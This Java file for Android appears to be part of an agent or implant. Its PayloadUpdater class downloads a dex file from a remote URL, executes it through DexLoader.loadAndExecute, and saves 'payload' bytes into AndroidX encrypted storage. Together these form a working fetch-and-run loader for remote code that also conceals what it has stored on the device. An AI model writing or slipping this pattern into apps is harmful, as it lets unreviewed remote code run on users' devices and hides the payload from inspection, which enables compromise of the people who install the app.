package com.mobilemorph.agent.utils;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import android.content.Context;
import androidx.security.crypto.EncryptedFile;
import androidx.security.crypto.MasterKeys;

public class PayloadUpdater {
    public static void updateAndLoad(Context context, String remoteUrl, String localPath) {
        try {
            // Download dex file
            URL url = new URL(remoteUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.connect();

            InputStream input = conn.getInputStream();
            OutputStream output = new FileOutputStream(localPath);

            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = input.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }

            output.flush();
            output.close();
            input.close();

            // Load downloaded payload
            DexLoader.loadAndExecute(context, localPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void saveEncryptedDex(Context context, byte[] payloadBytes, String fileName) {
        try {
            String masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);
            File file = new File(context.getFilesDir(), fileName);

            EncryptedFile encryptedFile = new EncryptedFile.Builder (
                file,
                context,
                masterKeyAlias,
                EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
            ).build();

            OutputStream out = encryptedFile.openFileOutput();
            out.write(payloadBytes);
            out.flush();
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
